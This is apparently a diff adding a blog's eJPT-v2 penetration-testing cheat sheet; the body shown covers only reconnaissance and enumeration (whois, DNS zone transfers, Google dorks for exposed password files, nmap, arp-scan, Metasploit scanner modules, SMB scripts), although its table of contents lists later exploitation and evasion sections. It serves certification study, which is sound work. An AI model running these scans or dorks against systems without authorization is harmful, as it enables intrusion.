@@ -1,0 +1,1006 @@
+
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="utf-8" />
+  <meta http-equiv="X-UA-Compatible" content="IE=edge" />
+  <meta name="HandheldFriendly" content="True" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <meta name="robots" content="noindex" />
+
+  <!--  <link rel="manifest" href="/assets/site.webmanifest" crossorigin="use-credentials">-->
+
+  <link href="https://fonts.googleapis.com/css2?family=Source+Code+Pro:ital,wght@0,400;0,700;1,400&family=Source+Sans+Pro:ital,wght@0,300;0,400;0,700;1,400&display=swap" rel="stylesheet">
+
+    <link rel="stylesheet" type="text/css" href="https://ojack69.github.io/jacks-corner/theme/stylesheet/style.min.css">
+
+    <link id="dark-theme-style" rel="stylesheet" type="text/css"
+          media="(prefers-color-scheme: dark), (prefers-color-scheme: no-preference)"
+    href="https://ojack69.github.io/jacks-corner/theme/stylesheet/dark-theme.min.css">
+
+    <link id="pygments-dark-theme" rel="stylesheet" type="text/css"
+              media="(prefers-color-scheme: dark), (prefers-color-scheme: no-preference)"
+          href="https://ojack69.github.io/jacks-corner/theme/pygments/monokai.min.css">
+    <link id="pygments-light-theme" rel="stylesheet" type="text/css"
+              media="(prefers-color-scheme: light)"
+          href="https://ojack69.github.io/jacks-corner/theme/pygments/emacs.min.css">
+
+
+  <link rel="stylesheet"
+        type="text/css"
+        href="https://ojack69.github.io/jacks-corner/theme/stork/stork.css" />
+
+  <link rel="stylesheet" type="text/css" href="https://ojack69.github.io/jacks-corner/theme/font-awesome/css/fontawesome.css">
+  <link rel="stylesheet" type="text/css" href="https://ojack69.github.io/jacks-corner/theme/font-awesome/css/brands.css">
+  <link rel="stylesheet" type="text/css" href="https://ojack69.github.io/jacks-corner/theme/font-awesome/css/solid.css">
+
+        <link rel="stylesheet" type="text/css" href="https://ojack69.github.io/jacks-corner/css/custom.css"> 
+        <link rel="stylesheet" type="text/css" href="https://ojack69.github.io/jacks-corner/css/zoom.css"> 
+        <link rel="stylesheet" type="text/css" href="https://ojack69.github.io/jacks-corner/css/collapsible-toc.css"> 
+        <link rel="stylesheet" type="text/css" href="https://ojack69.github.io/jacks-corner/css/goals.css"> 
+
+
+      <script src="https://code.jquery.com/jquery-3.7.1.min.js" type="application/javascript"></script>
+      <script src="https://cdn.jsdelivr.net/npm/dompurify@3.2.4/dist/purify.min.js" type="application/javascript"></script>
+      <script src="https://ojack69.github.io/jacks-corner/js/collapsible-toc.js" type="application/javascript"></script>
+      <script src="https://ojack69.github.io/jacks-corner/js/zoom.js" type="application/javascript"></script>
+      <script src="https://ojack69.github.io/jacks-corner/js/app.js" type="application/javascript"></script>
+      <script src="https://ojack69.github.io/jacks-corner/js/goals.js" type="application/javascript"></script>
+
+
+
+
+
+
+
+
+
+
+
+ 
+
+<meta name="author" content="Jack69" />
+<meta name="description" content="Information Gathering Website Recon &amp; Footprinting IP addresses: DNS: host, dig, nslookup, ping, dnsrecon,dnsdumpster whois Google Dorks Network Information: Domains: sublist3r WAF: wafw00f Hidden directories: robots.txt sitemap.xml or sitemaps.xml Google Dorks Names: whois Emails: whois, (theHarvester)[https://github.com/laramies/theHarvester] Phone numbers: whois Physical Addresses: whois …" />
+<meta name="keywords" content="">
+
+
+  <meta property="og:site_name" content="Jack's Corner"/>
+  <meta property="og:title" content="eJPT-v2 Cheatsheet"/>
+  <meta property="og:description" content="Information Gathering Website Recon &amp; Footprinting IP addresses: DNS: host, dig, nslookup, ping, dnsrecon,dnsdumpster whois Google Dorks Network Information: Domains: sublist3r WAF: wafw00f Hidden directories: robots.txt sitemap.xml or sitemaps.xml Google Dorks Names: whois Emails: whois, (theHarvester)[https://github.com/laramies/theHarvester] Phone numbers: whois Physical Addresses: whois …"/>
+  <meta property="og:locale" content="en_US"/>
+  <meta property="og:url" content="https://ojack69.github.io/jacks-corner/certifications/inesecurity/ejpt-cheatsheet.html"/>
+  <meta property="og:type" content="article"/>
+  <meta property="article:published_time" content="1957-01-01 00:00:00+01:00"/>
+  <meta property="article:modified_time" content=""/>
+  <meta property="article:author" content="https://ojack69.github.io/jacks-corner/author/jack69.html">
+  <meta property="article:section" content="Cheatsheet"/>
+  <meta property="og:image" content="">
+
+  <title>Jack's Corner &ndash; eJPT-v2 Cheatsheet</title>
+
+
+</head>
+<body >
+
+<aside>
+  <div>
+    <a href="https://ojack69.github.io/jacks-corner/">
+      <img src="https://ojack69.github.io/jacks-corner/theme/img/profile.png" alt="Jack's Corner" title="Jack's Corner">
+    </a>
+
+    <h1>
+      <a href="https://ojack69.github.io/jacks-corner/">Jack's Corner</a>
+    </h1>
+
+
+    <div class="stork">
+        <input class="stork-input" type="text" autocomplete="off" name="q" data-stork="sitesearch" placeholder="Search..." onclick=""/>
+      <div class="stork-output" data-stork="sitesearch-output"></div>
+    </div>
+
+
+    <ul class="social">
+      <li>
+        <a class="sc-htb"
+           href="https://app.hackthebox.com/profile/177323"
+           target="_blank">
+          <i class="fa-brands fa-htb"></i>
+        </a>
+      </li>
+      <li>
+        <a class="sc-thm"
+           href="https://tryhackme.com/p/jack69"
+           target="_blank">
+          <i class="fa-brands fa-thm"></i>
+        </a>
+      </li>
+    </ul>
+  </div>
+</aside>
+  <main>
+
+<nav>
+  <a href="https://ojack69.github.io/jacks-corner/">Home</a>
+
+  <a href="https://ojack69.github.io/jacks-corner/categories.html">Categories</a>
+  <a href="https://ojack69.github.io/jacks-corner/category/cheatsheet.html">Cheatsheets</a>
+  <a href="https://ojack69.github.io/jacks-corner/personal/goals.html">Goals</a>
+
+
+</nav>
+
+<article class="single">
+  <header>
+      
+    <h1 id="certifications/inesecurity/ejpt-cheatsheet">eJPT-v2 Cheatsheet</h1>
+    <p>
+
+    </p>
+  </header>
+
+
+  <div>
+        <div class="toc col-lg-3 hidden-xs hidden-sm">
+            <div id="toc"><ul><li><a class="toc-href" href="#information-gathering" title="Information Gathering">Information Gathering</a><ul><li><a class="toc-href" href="#website-recon-footprinting" title="Website Recon &amp; Footprinting">Website Recon &amp; Footprinting</a><ul><li><a class="toc-href" href="#google-dorks" title="Google Dorks">Google Dorks</a></li></ul></li><li><a class="toc-href" href="#active-information-gathering_1" title="Active Information Gathering">Active Information Gathering</a><ul><li><a class="toc-href" href="#dns-zone-transfers" title="DNS Zone Transfers">DNS Zone Transfers</a></li><li><a class="toc-href" href="#host-discovery" title="Host Discovery">Host Discovery</a></li></ul></li></ul></li><li><a class="toc-href" href="#footprinting-scanning_2" title="Footprinting &amp; Scanning">Footprinting &amp; Scanning</a><ul><li><a class="toc-href" href="#network-host-mapping" title="Network Host Mapping">Network Host Mapping</a><ul><li><a class="toc-href" href="#wireshark" title="Wireshark">Wireshark</a></li><li><a class="toc-href" href="#arp-scan" title="ARP scan">ARP scan</a></li><li><a class="toc-href" href="#fping" title="fping">fping</a></li><li><a class="toc-href" href="#nmap" title="nmap">nmap</a></li></ul></li><li><a class="toc-href" href="#port-scanning_1" title="Port Scanning">Port Scanning</a><ul><li><a class="toc-href" href="#nmap_1" title="nmap">nmap</a></li><li><a class="toc-href" href="#metasploit" title="metasploit">metasploit</a></li></ul></li><li><a class="toc-href" href="#enumeration_1" title="Enumeration">Enumeration</a><ul><li><a class="toc-href" href="#smb" title="SMB">SMB</a><ul><li><a class="toc-href" href="#nmap_2" title="nmap">nmap</a></li><li><a class="toc-href" href="#smbmap" title="smbmap">smbmap</a></li><li><a class="toc-href" href="#metasploit_1" title="metasploit">metasploit</a></li><li><a class="toc-href" href="#nmblookup" title="nmblookup">nmblookup</a></li><li><a class="toc-href" href="#smbclient" title="smbclient">smbclient</a></li><li><a class="toc-href" href="#rpcclient" title="rpcclient">rpcclient</a></li><li><a class="toc-href" href="#enum4linux" title="enum4linux">enum4linux</a></li><li><a class="toc-href" href="#hydra" title="hydra">hydra</a></li></ul></li><li><a class="toc-href" href="#ftp_1" title="FTP">FTP</a><ul><li><a class="toc-href" href="#hydra_1" title="hydra">hydra</a></li><li><a class="toc-href" href="#nmap_3" title="nmap">nmap</a></li></ul></li><li><a class="toc-href" href="#ssh_1" title="SSH">SSH</a><ul><li><a class="toc-href" href="#netcat" title="netcat">netcat</a></li><li><a class="toc-href" href="#nmap_4" title="nmap">nmap</a></li><li><a class="toc-href" href="#hydra_2" title="hydra">hydra</a></li><li><a class="toc-href" href="#metasploit_2" title="metasploit">metasploit</a></li></ul></li><li><a class="toc-href" href="#http_1" title="HTTP">HTTP</a><ul><li><a class="toc-href" href="#nmap_5" title="nmap">nmap</a></li><li><a class="toc-href" href="#metasploit_3" title="metasploit">metasploit</a></li></ul></li><li><a class="toc-href" href="#mysql_1" title="MySQL">MySQL</a><ul><li><a class="toc-href" href="#metasploit_4" title="metasploit">metasploit</a></li><li><a class="toc-href" href="#nmap_6" title="nmap">nmap</a></li><li><a class="toc-href" href="#hydra_3" title="hydra">hydra</a></li></ul></li><li><a class="toc-href" href="#mssql_1" title="MSSQL">MSSQL</a><ul><li><a class="toc-href" href="#nmap_7" title="nmap">nmap</a></li><li><a class="toc-href" href="#metasploit_5" title="metasploit">metasploit</a></li></ul></li><li><a class="toc-href" href="#smtp_1" title="SMTP">SMTP</a><ul><li><a class="toc-href" href="#metasploit_6" title="metasploit">metasploit</a></li></ul></li></ul></li></ul></li><li><a class="toc-href" href="#vulnerability-assessment_3" title="Vulnerability Assessment">Vulnerability Assessment</a><ul><li><a class="toc-href" href="#heartbleed" title="Heartbleed">Heartbleed</a><ul><li><a class="toc-href" href="#nmap_8" title="nmap">nmap</a></li><li><a class="toc-href" href="#exploitdb" title="ExploitDB">ExploitDB</a></li></ul></li><li><a class="toc-href" href="#eternalblue-ms17-1010_1" title="EternalBlue - MS17-1010">EternalBlue - MS17-1010</a><ul><li><a class="toc-href" href="#nmap_9" title="nmap">nmap</a></li><li><a class="toc-href" href="#exploitdb_1" title="ExploitDB">ExploitDB</a></li></ul></li><li><a class="toc-href" href="#log4j_1" title="Log4J">Log4J</a><ul><li><a class="toc-href" href="#nmap_10" title="nmap">nmap</a></li></ul></li><li><a class="toc-href" href="#webdav_1" title="WebDAV">WebDAV</a><ul><li><a class="toc-href" href="#davtest" title="davtest">davtest</a></li><li><a class="toc-href" href="#cadaver" title="cadaver">cadaver</a></li><li><a class="toc-href" href="#nmap_11" title="Nmap">Nmap</a></li><li><a class="toc-href" href="#hydra_4" title="Hydra">Hydra</a></li><li><a class="toc-href" href="#metasploit_7" title="Metasploit">Metasploit</a></li></ul></li><li><a class="toc-href" href="#smb_2" title="SMB">SMB</a><ul><li><a class="toc-href" href="#impacket-scripts" title="Impacket Scripts">Impacket Scripts</a></li><li><a class="toc-href" href="#metasploit_8" title="Metasploit">Metasploit</a></li></ul></li><li><a class="toc-href" href="#ms17-010-eternalblue-exploit_1" title="MS17-010 EternalBlue Exploit">MS17-010 EternalBlue Exploit</a><ul><li><a class="toc-href" href="#nmap_12" title="Nmap">Nmap</a></li><li><a class="toc-href" href="#metasploit_9" title="Metasploit">Metasploit</a></li><li><a class="toc-href" href="#autoblue" title="AutoBlue">AutoBlue</a></li></ul></li><li><a class="toc-href" href="#rdp_1" title="RDP">RDP</a><ul><li><a class="toc-href" href="#nmap_13" title="Nmap">Nmap</a></li><li><a class="toc-href" href="#metasploit_10" title="Metasploit">Metasploit</a></li><li><a class="toc-href" href="#hydra_5" title="Hydra">Hydra</a></li><li><a class="toc-href" href="#xfreerdp" title="xfreerdp">xfreerdp</a></li></ul></li><li><a class="toc-href" href="#cve-2019-0708-bluekeep_1" title="CVE-2019-0708 - BlueKeep">CVE-2019-0708 - BlueKeep</a><ul><li><a class="toc-href" href="#nmap_14" title="Nmap">Nmap</a></li><li><a class="toc-href" href="#metasploit_11" title="Metasploit">Metasploit</a></li></ul></li><li><a class="toc-href" href="#winrm_1" title="WinRM">WinRM</a><ul><li><a class="toc-href" href="#crackmapexec" title="crackmapexec">crackmapexec</a></li><li><a class="toc-href" href="#evil-winrm" title="evil-winrm">evil-winrm</a></li><li><a class="toc-href" href="#nmap_15" title="Nmap">Nmap</a></li><li><a class="toc-href" href="#metasploit_12" title="Metasploit">Metasploit</a></li></ul></li></ul></li><li><a class="toc-href" href="#network-based-attacks_2" title="Network-Based Attacks">Network-Based Attacks</a><ul><li><a class="toc-href" href="#wireshark_1" title="Wireshark">Wireshark</a></li><li><a class="toc-href" href="#tshark" title="Tshark">Tshark</a></li><li><a class="toc-href" href="#arp-poisoning" title="ARP Poisoning">ARP Poisoning</a></li></ul></li><li><a class="toc-href" href="#metasploit-framework_1" title="Metasploit Framework">Metasploit Framework</a><ul><li><a class="toc-href" href="#msf-console" title="MSF Console">MSF Console</a></li><li><a class="toc-href" href="#msf-workspaces" title="MSF Workspaces">MSF Workspaces</a></li><li><a class="toc-href" href="#msf-information-gathering-enumeration" title="MSF: Information Gathering &amp; Enumeration">MSF: Information Gathering &amp; Enumeration</a></li><li><a class="toc-href" href="#msf-wmap" title="MSF: WMAP">MSF: WMAP</a></li><li><a class="toc-href" href="#msfvenom" title="MSFVenom">MSFVenom</a></li><li><a class="toc-href" href="#meterpreter" title="Meterpreter">Meterpreter</a></li><li><a class="toc-href" href="#post-exploitation-modules" title="Post-Exploitation Modules">Post-Exploitation Modules</a></li><li><a class="toc-href" href="#msf-pivoting" title="MSF: Pivoting">MSF: Pivoting</a></li></ul></li><li><a class="toc-href" href="#windows-privilege-escalation_1" title="Windows Privilege Escalation">Windows Privilege Escalation</a><ul><li><a class="toc-href" href="#windows-kernel-exploitation" title="Windows Kernel Exploitation">Windows Kernel Exploitation</a></li><li><a class="toc-href" href="#metasploit_13" title="Metasploit">Metasploit</a></li><li><a class="toc-href" href="#bypassing-uac_1" title="Bypassing UAC">Bypassing UAC</a></li><li><a class="toc-href" href="#access-token-impersonation" title="Access Token Impersonation">Access Token Impersonation</a><ul><li><a class="toc-href" href="#meterpreter_1" title="Meterpreter">Meterpreter</a></li></ul></li><li><a class="toc-href" href="#windows-file-system-vulnerabilities_1" title="Windows File System Vulnerabilities">Windows File System Vulnerabilities</a><ul><li><a class="toc-href" href="#alternate-data-streams" title="Alternate Data Streams">Alternate Data Streams</a></li></ul></li></ul></li><li><a class="toc-href" href="#windows-credential_2" title="Windows Credential">Windows Credential</a><ul><li><a class="toc-href" href="#exfiltrate-crack-passwords" title="Exfiltrate &amp; Crack Passwords">Exfiltrate &amp; Crack Passwords</a><ul><li><a class="toc-href" href="#mimikatz" title="Mimikatz">Mimikatz</a></li><li><a class="toc-href" href="#metasploit_14" title="Metasploit">Metasploit</a></li><li><a class="toc-href" href="#cracking" title="Cracking">Cracking</a></li></ul></li><li><a class="toc-href" href="#pass-the-hash-attack_1" title="Pass-the-Hash Attack">Pass-the-Hash Attack</a><ul><li><a class="toc-href" href="#metasploit_15" title="Metasploit">Metasploit</a></li><li><a class="toc-href" href="#crackmapexec_1" title="Crackmapexec">Crackmapexec</a></li></ul></li></ul></li><li><a class="toc-href" href="#linux-privilege-escalation_2" title="Linux Privilege Escalation">Linux Privilege Escalation</a><ul><li><a class="toc-href" href="#bash-cve-2014-6271-vulnerability-shellshock" title="Bash CVE-2014-6271 Vulnerability (Shellshock)">Bash CVE-2014-6271 Vulnerability (Shellshock)</a><ul><li><a class="toc-href" href="#nmap_16" title="NMAP">NMAP</a></li><li><a class="toc-href" href="#metsploit" title="Metsploit">Metsploit</a></li></ul></li><li><a class="toc-href" href="#linux-kernel-exploits_1" title="Linux Kernel Exploits">Linux Kernel Exploits</a></li><li><a class="toc-href" href="#linux-credential-cracking" title="Linux Credential Cracking">Linux Credential Cracking</a><ul><li><a class="toc-href" href="#metasploit_16" title="Metasploit">Metasploit</a></li><li><a class="toc-href" href="#johntheripper" title="JohnTheRipper">JohnTheRipper</a></li><li><a class="toc-href" href="#hashcat" title="Hashcat">Hashcat</a></li></ul></li></ul></li><li><a class="toc-href" href="#windows-post-exploitation_2" title="Windows Post-Exploitation">Windows Post-Exploitation</a><ul><li><a class="toc-href" href="#enumeration_2" title="Enumeration">Enumeration</a></li><li><a class="toc-href" href="#file-transfer" title="File Transfer">File Transfer</a></li><li><a class="toc-href" href="#persistence" title="Persistence">Persistence</a></li></ul></li><li><a class="toc-href" href="#clearing-your-tracks_1" title="Clearing your tracks">Clearing your tracks</a></li><li><a class="toc-href" href="#av-evasion-obfuscation" title="AV Evasion &amp; Obfuscation">AV Evasion &amp; Obfuscation</a><ul><li><a class="toc-href" href="#shellter" title="Shellter">Shellter</a></li><li><a class="toc-href" href="#invoke-obfuscation" title="Invoke-Obfuscation">Invoke-Obfuscation</a></li></ul></li><li><a class="toc-href" href="#upgrading-shells_1" title="Upgrading Shells">Upgrading Shells</a></li></ul></div>
+        </div>
+    <h1 id="information-gathering">Information Gathering</h1>
+<h2 id="website-recon-footprinting">Website Recon &amp; Footprinting</h2>
+<ul>
+<li>IP addresses: <ul>
+<li>DNS: host, dig, nslookup, ping, <a href="https://www.kali.org/tools/dnsrecon/">dnsrecon</a>,<a href="https://dnsdumpster.com">dnsdumpster</a></li>
+<li>whois</li>
+<li>Google Dorks</li>
+</ul>
+</li>
+<li>Network Information:<ul>
+<li>Domains: <a href="https://github.com/aboul3la/Sublist3r">sublist3r</a></li>
+<li>WAF: <a href="https://github.com/EnableSecurity/wafw00f">wafw00f</a></li>
+</ul>
+</li>
+<li>Hidden directories:<ul>
+<li>robots.txt</li>
+<li>sitemap.xml or sitemaps.xml</li>
+<li>Google Dorks</li>
+</ul>
+</li>
+<li>Names:<ul>
+<li>whois</li>
+</ul>
+</li>
+<li>Emails:<ul>
+<li>whois, (theHarvester)[https://github.com/laramies/theHarvester]</li>
+</ul>
+</li>
+<li>Phone numbers:<ul>
+<li>whois</li>
+</ul>
+</li>
+<li>Physical Addresses:<ul>
+<li>whois</li>
+</ul>
+</li>
+<li>Passwords:<ul>
+<li><a href="https://haveibeenpwned.com">havibeenpwned</a></li>
+</ul>
+</li>
+<li>Web Technologies Footprinting<ul>
+<li>robots.txt</li>
+<li>Browser plugins: BuiltWith, Wappalyzer</li>
+<li>cli: whatweb, <a href="https://www.httrack.com">httrack</a></li>
+</ul>
+</li>
+</ul>
+<h3 id="google-dorks">Google Dorks</h3>
+<p>Dorks accept wildcards:</p>
+<div class="highlight"><pre><span></span><code><span class="o">-</span><span class="w"> </span><span class="nx">site</span><span class="p">:</span><span class="s">"&lt; site &gt;"</span><span class="w"> </span><span class="c1">// matches the site domain and subdomains</span>
+<span class="o">-</span><span class="w"> </span><span class="nx">inurl</span><span class="p">:</span><span class="s">"&lt; keyword &gt;"</span><span class="w"> </span><span class="c1">// matches the keyword into url</span>
+<span class="o">-</span><span class="w"> </span><span class="nx">intitle</span><span class="p">:</span><span class="s">"&lt; keyword &gt;"</span><span class="w"> </span><span class="c1">// matches the keyword into site title</span>
+<span class="o">-</span><span class="w"> </span><span class="nx">filetype</span><span class="p">:</span><span class="s">"&lt; filetype &gt;"</span><span class="w"> </span><span class="c1">// matches files of specified extension</span>
+<span class="o">-</span><span class="w"> </span><span class="nx">cache</span><span class="p">:</span><span class="s">"&lt; site &gt;"</span><span class="w"> </span><span class="c1">// find the old versions of the site</span>
+</code></pre></div>
+<p>Cool Examples:</p>
+<div class="highlight"><pre><span></span><code><span class="k">-</span> intitle:"index of" // finds webservers with directory listing enabled
+<span class="k">-</span> inurl:"auth_user_file.txt" | inurl:"passwd" // find webserver with file exposing users or/and passwords (auth_user_file and passwd are an examples)
+</code></pre></div>
+<p>Cool resources:</p>
+<ul>
+<li><a href="https://www.exploit-db.com/google-hacking-database">Google Hacking Database</a></li>
+</ul>
+<h2 id="active-information-gathering_1">Active Information Gathering</h2>
+<h3 id="dns-zone-transfers">DNS Zone Transfers</h3>
+<p>Cool resource:</p>
+<ul>
+<li>zonetransfer.me : playground domain useful when testing tools regarding DNS pentesting</li>
+</ul>
+<p>*Note: /etc/hosts has priority above dns server when resolving a name</p>
+<p>Useful tools:</p>
+<ul>
+<li>
+<p>dnsenum: performs dns enumeration, dns bruteforce, automatic zone transfer, etc.</p>
+</li>
+<li>
+<p>dig axfr @&lt; nameserver &gt; &lt; domain&gt;</p>
+</li>
+<li>
+<p><a href="https://github.com/mschwager/fierce">fierce</a>: DNS reconnaissance tool for locating non-contiguous IP space.</p>
+</li>
+</ul>
+<h3 id="host-discovery">Host Discovery</h3>
+<div class="highlight"><pre><span></span><code><span class="o">-</span><span class="w"> </span><span class="n">nmap</span><span class="w"> </span><span class="o">-</span><span class="n">sn</span><span class="w"> </span><span class="o">&lt;</span><span class="n">ip</span><span class="w"> </span><span class="n">CIDR</span><span class="w"> </span><span class="nb">range</span><span class="o">&gt;</span>
+<span class="w">    </span><span class="o">-</span><span class="w"> </span><span class="n">sn</span><span class="p">:</span><span class="w"> </span><span class="n">no</span><span class="w"> </span><span class="n">port</span><span class="w"> </span><span class="n">scan</span><span class="w"> </span><span class="p">(</span><span class="n">see</span><span class="w"> </span><span class="n">man</span><span class="w"> </span><span class="n">nmap</span><span class="p">)</span>
+
+<span class="o">-</span><span class="w"> </span><span class="n">netdiscover</span><span class="p">:</span><span class="w"> </span><span class="k">tool</span><span class="w"> </span><span class="n">used</span><span class="w"> </span><span class="k">for</span><span class="w"> </span><span class="n">host</span><span class="w"> </span><span class="n">discovery</span><span class="w"> </span>
+</code></pre></div>
+<p>Nmap options:</p>
+<p>-F performs a fast scan, scanning the 1000 most common ports<br/>
+-sU performs a standard UDP scan * 
+-sV performs service version detection<br/>
+-sC runs defaults scripts set<br/>
+-p &lt; port range or list &gt;<br/>
+-O tries enumerate operating system<br/>
+-T paranoid|sneaky|polite|normal|aggressive|insane specifies the timing template (speed up or slow down the scan)
+- paranoid =&gt; T0
+- sneaky =&gt; T1
+- polite =&gt; T2
+- normal =&gt; T3
+- aggressive =&gt; T4
+- insane =&gt; T5<br/>
+-oN &lt; file &gt; output the result to a file</p>
+<p>* Note: when running UDP scan, the scan is faster using the --min-rate option</p>
+<h1 id="footprinting-scanning_2">Footprinting &amp; Scanning</h1>
+<h2 id="network-host-mapping">Network Host Mapping</h2>
+<h3 id="wireshark">Wireshark</h3>
+<p>To get the list of all hosts in intercepted packages:
+- statistcs &gt; endpoints</p>
+<h3 id="arp-scan">ARP scan</h3>
+<div class="highlight"><pre><span></span><code>arp-scan -I &lt;interface&gt; -g &lt;subnet&gt; // get the subnet with ip -a
+</code></pre></div>
+<h3 id="fping">fping</h3>
+<p>fping allows to ping multiple host at one time unlike ping</p>
+<div class="highlight"><pre><span></span><code>- fping -I &lt;interface&gt; -g &lt;subnet&gt; -a 2&gt;/dev/null
+</code></pre></div>
+<p><em>Note</em>: some hosts might not respond to ping but they might be in some arp-table; viceversa, some hosts might not be in any arp-table but they might be enumerated via ping.</p>
+<h3 id="nmap">nmap</h3>
+<div class="highlight"><pre><span></span><code>nmap -sn &lt;subnet&gt;
+</code></pre></div>
+<h2 id="port-scanning_1">Port Scanning</h2>
+<h3 id="nmap_1">nmap</h3>
+<div class="highlight"><pre><span></span><code><span class="o">-</span><span class="w"> </span><span class="n">nmap</span><span class="w"> </span><span class="o">-</span><span class="n">iL</span><span class="w"> </span><span class="o">&lt;</span><span class="n">file</span><span class="w"> </span><span class="n">containing</span><span class="w"> </span><span class="n">ips</span><span class="o">&gt;</span><span class="w"> </span><span class="o">//</span><span class="w"> </span><span class="n">basic</span><span class="w"> </span><span class="n">scan</span>
+<span class="o">-</span><span class="w"> </span><span class="n">nmap</span><span class="w"> </span><span class="o">-</span><span class="n">iL</span><span class="w"> </span><span class="o">&lt;</span><span class="n">file</span><span class="w"> </span><span class="n">containing</span><span class="w"> </span><span class="n">ips</span><span class="o">&gt;</span><span class="w"> </span><span class="o">-</span><span class="n">sV</span><span class="w"> </span><span class="o">-</span><span class="n">O</span><span class="w"> </span><span class="o">//</span><span class="w"> </span><span class="n">enumerate</span><span class="w"> </span><span class="n">services</span><span class="w"> </span><span class="n">versions</span><span class="w"> </span><span class="ow">and</span><span class="w"> </span><span class="n">OS</span>
+<span class="o">-</span><span class="w"> </span><span class="n">nmap</span><span class="w"> </span><span class="o">-</span><span class="n">iL</span><span class="w"> </span><span class="o">&lt;</span><span class="n">file</span><span class="w"> </span><span class="n">containing</span><span class="w"> </span><span class="n">ips</span><span class="o">&gt;</span><span class="w"> </span><span class="o">-</span><span class="n">sV</span><span class="w"> </span><span class="o">-</span><span class="n">O</span><span class="w"> </span><span class="o">-</span><span class="n">sC</span><span class="w"> </span><span class="o">//</span><span class="w"> </span><span class="n">enumerate</span><span class="w"> </span><span class="n">services</span><span class="w"> </span><span class="n">versions</span><span class="p">,</span><span class="w"> </span><span class="n">OS</span><span class="w"> </span><span class="ow">and</span><span class="w"> </span><span class="n">test</span><span class="w"> </span><span class="k">for</span><span class="w"> </span><span class="n">some</span><span class="w"> </span><span class="n">vulnerabilities</span><span class="w"> </span><span class="p">(</span><span class="n">default</span><span class="w"> </span><span class="n">nmap</span><span class="w"> </span><span class="n">scripts</span><span class="p">)</span>
+</code></pre></div>
+<h3 id="metasploit">metasploit</h3>
+<p>Common used TCP port scanning modules:</p>
+<div class="highlight"><pre><span></span><code>- auxiliary/scanner/portscan/ack
+- auxiliary/scanner/portscan/syn
+- auxiliary/scanner/portscan/tcp
+</code></pre></div>
+<p>UDP service and port discovery:</p>
+<div class="highlight"><pre><span></span><code><span class="k">-</span> auxiliary/scanner/discovery/udp_sweep
+</code></pre></div>
+<h2 id="enumeration_1">Enumeration</h2>
+<h3 id="smb">SMB</h3>
+<h4 id="nmap_2">nmap</h4>
+<div class="highlight"><pre><span></span><code>- nmap -sU --top-ports 25 -sV --open &lt;target&gt; // UDP ports
+</code></pre></div>
+<p>SMB Enumeration scripts:</p>
+<div class="highlight"><pre><span></span><code><span class="o">-</span><span class="w"> </span><span class="n">smb</span><span class="o">-</span><span class="n">protocols</span><span class="p">:</span><span class="w"> </span><span class="n">Attempts</span><span class="w"> </span><span class="n">to</span><span class="w"> </span><span class="n">list</span><span class="w"> </span><span class="n">the</span><span class="w"> </span><span class="n">supported</span><span class="w"> </span><span class="n">protocols</span><span class="w"> </span><span class="ow">and</span><span class="w"> </span><span class="n">dialects</span><span class="w"> </span><span class="n">of</span><span class="w"> </span><span class="n">a</span><span class="w"> </span><span class="n">SMB</span><span class="w"> </span><span class="n">server</span>
+<span class="o">-</span><span class="w"> </span><span class="n">smb</span><span class="o">-</span><span class="n">security</span><span class="o">-</span><span class="n">mode</span><span class="p">:</span><span class="w"> </span><span class="n">Returns</span><span class="w"> </span><span class="n">information</span><span class="w"> </span><span class="n">about</span><span class="w"> </span><span class="n">the</span><span class="w"> </span><span class="n">SMB</span><span class="w"> </span><span class="n">security</span><span class="w"> </span><span class="n">level</span><span class="w"> </span><span class="n">determined</span><span class="w"> </span><span class="n">by</span><span class="w"> </span><span class="n">SMB</span>
+<span class="o">-</span><span class="w"> </span><span class="n">smb</span><span class="o">-</span><span class="k">enum</span><span class="o">-</span><span class="n">sessions</span><span class="p">:</span><span class="w"> </span><span class="n">Enumerates</span><span class="w"> </span><span class="n">the</span><span class="w"> </span><span class="n">users</span><span class="w"> </span><span class="n">logged</span><span class="w"> </span><span class="n">into</span><span class="w"> </span><span class="n">a</span><span class="w"> </span><span class="n">system</span><span class="w"> </span><span class="n">either</span><span class="w"> </span><span class="n">locally</span><span class="w"> </span><span class="ow">or</span><span class="w"> </span><span class="n">through</span><span class="w"> </span><span class="n">an</span><span class="w"> </span><span class="n">SMB</span><span class="w"> </span><span class="n">share</span>
+<span class="w">    </span><span class="o">-</span><span class="w"> </span><span class="k">if</span><span class="w"> </span><span class="n">any</span><span class="w"> </span><span class="n">credentials</span><span class="w"> </span><span class="n">are</span><span class="w"> </span><span class="n">available</span><span class="p">,</span><span class="w"> </span><span class="n">this</span><span class="w"> </span><span class="n">script</span><span class="w"> </span><span class="n">can</span><span class="w"> </span><span class="n">be</span><span class="w"> </span><span class="n">run</span><span class="w"> </span><span class="n">with</span><span class="w"> </span><span class="n">them</span><span class="w"> </span><span class="n">using</span><span class="w"> </span><span class="n">the</span><span class="w"> </span><span class="o">--</span><span class="n">script</span><span class="o">-</span><span class="n">args</span><span class="w"> </span><span class="n">option</span>
+<span class="o">-</span><span class="w"> </span><span class="n">smb</span><span class="o">-</span><span class="k">enum</span><span class="o">-</span><span class="n">shares</span><span class="p">:</span><span class="w"> </span><span class="n">Attempts</span><span class="w"> </span><span class="n">to</span><span class="w"> </span><span class="n">list</span><span class="w"> </span><span class="n">shares</span><span class="w"> </span>
+<span class="w">    </span><span class="o">-</span><span class="w"> </span><span class="n">same</span><span class="w"> </span><span class="k">as</span><span class="w"> </span><span class="n">up</span>
+<span class="o">-</span><span class="w"> </span><span class="n">smb</span><span class="o">-</span><span class="k">enum</span><span class="o">-</span><span class="n">users</span><span class="p">:</span><span class="w"> </span><span class="n">enumerate</span><span class="w"> </span><span class="n">existing</span><span class="w"> </span><span class="n">users</span>
+<span class="o">-</span><span class="w"> </span><span class="n">smb</span><span class="o">-</span><span class="n">server</span><span class="o">-</span><span class="n">stats</span><span class="p">:</span><span class="w"> </span><span class="n">get</span><span class="w"> </span><span class="n">smb</span><span class="w"> </span><span class="n">server</span><span class="w"> </span><span class="n">stats</span>
+<span class="o">-</span><span class="w"> </span><span class="n">smb</span><span class="o">-</span><span class="k">enum</span><span class="o">-</span><span class="n">domains</span><span class="p">:</span><span class="w"> </span><span class="n">enumerate</span><span class="w"> </span><span class="n">existing</span><span class="w"> </span><span class="n">domains</span><span class="w"> </span><span class="n">information</span>
